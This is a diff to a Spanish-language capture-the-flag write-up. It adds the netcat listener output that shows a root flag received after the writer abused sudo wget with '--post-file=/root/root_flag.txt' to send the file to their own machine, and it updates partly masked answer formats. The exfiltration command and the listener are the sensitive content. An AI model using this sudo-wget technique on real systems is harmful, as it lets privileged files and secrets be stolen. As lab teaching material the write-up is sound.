@@ -52,6 +52,24 @@ $ nc -lvnp 1234
 
 En el server
 sudo /usr/bin/wget --post-file=/root/root_flag.txt IP_Local:port
+
+En local
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.183.40.
+Ncat: Connection from 10.10.183.40:43980.
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.8.13.25:1234
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+b1xxxxxxxxxxxxxxxxxxxxxxxxxxxxx3d
+
 ```
 
 ya tenmeos la flag de root.
@@ -62,7 +80,8 @@ ya tenmeos la flag de root.
 ```Answer format: 05****************************f6```
 
 
-### #2	Root flag
- 
-Answer format: ********************************
+### #2	Root flag<p>
+### Solucion: 
+
+```Answer format: b1****************************3d```
 
